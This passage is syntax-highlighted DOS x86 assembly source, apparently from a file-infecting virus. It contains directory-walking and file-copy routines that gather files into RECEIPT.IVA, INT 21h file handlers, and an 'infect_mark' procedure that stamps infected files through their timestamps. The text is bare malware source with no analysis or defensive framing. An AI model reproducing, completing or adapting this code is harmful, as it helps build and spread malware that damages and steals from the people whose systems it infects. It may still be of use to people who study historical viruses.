         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of end of pathname</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write sixty-four bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">      </span><span class="sc1">; Write fourteen bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">      </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">4ch</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of file within ...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_eof</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of filesize</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Write four bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of file within ...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">
</span><span class="sc5">copy_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of file within ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; Read one thousand and twenty-fou...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Read all of the file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">call_fnd_nxt</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to call_fnd_nxt</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes actually read</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_file</span><span class="sc0">
</span><span class="sc5">call_fnd_nxt</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of file within ...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_next</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fnd_nxt_loop</span><span class="sc0">    </span><span class="sc1">; Error? Jump to fnd_nxt_loop</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_next_</span><span class="sc0">
</span><span class="sc5">fnd_nxt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">      </span><span class="sc1">; DX = offset of next file specifi...</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Decrease count register</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; No more files?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_name</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to copy_name</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_first_</span><span class="sc0">
</span><span class="sc5">copy_name</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
</span><span class="sc5">find_first__</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_specifi</span><span class="sc0">     </span><span class="sc1">; DX = offset of file_specifi</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000010111b</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_first</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">receip_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to receip_exit</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_count</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">found_dir</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Don't examine disk transfer area</span><span class="sc0">
</span><span class="sc5">test_count</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Examine disk transfer area?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_dta</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to examine_dta</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_next</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">receipt_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to receipt_exit</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Decrease CX</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_count</span><span class="sc0">
</span><span class="sc5">examine_dta</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Increase count register</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">44h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of end of pathname</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; AX = segment of disk transfer area</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "      "      "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">      </span><span class="sc1">; SI = offset of attribute of file...</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = attribute of file found</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010000b</span><span class="sc0">    </span><span class="sc1">; Directory?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_dir</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to found_dir</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; Directory?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_dir</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to found_dir</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = store or don't store backslash</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DI = offset of end of pathname</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Don't store backslash?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_name_</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to copy_name_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'              ; AL = backslash
</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store backslash</span><span class="sc0">
</span><span class="sc5">copy_name_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">store_zero</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to store_zero</span><span class="sc0">

         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of filename</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_name_</span><span class="sc0">
</span><span class="sc5">store_zero</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; DX = offset of end of pathname</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; AL = zero</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store zero</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = number of file specifications</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS = segment of file specifictions</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_recei</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">      </span><span class="sc1">; Set current directory</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DI = offset of end of pathname</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; AL = zero</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store zero</span><span class="sc0">

         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_first__</span><span class="sc0">
</span><span class="sc5">receipt_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
</span><span class="sc5">receip_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; SP = stack pointer</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">open_file</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Open file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3dffh</span><span class="sc0">        </span><span class="sc1">; Open file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CL = attribute mask of files to ...</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">find_first</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Find first matching file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4e00h</span><span class="sc0">        </span><span class="sc1">; Find first matching file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">find_next</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Find next matching file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; Find next matching file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">load_info</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get file's date and time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; Get file's date and time</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">     </span><span class="sc1">; Store file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store file date</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_mark</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infection mark</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">        </span><span class="sc1">; Set file's date and time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = file date</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111111111100000b</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000000001b</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">read_file</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">

</span><span class="sc5">read_file_</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Create file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">      </span><span class="sc1">; Create file</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX = file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">write_file</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">

</span><span class="sc5">write_file_</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_pos_cfp</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (CFP)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">        </span><span class="sc1">; Set current file position (CFP)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_pos_eof</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
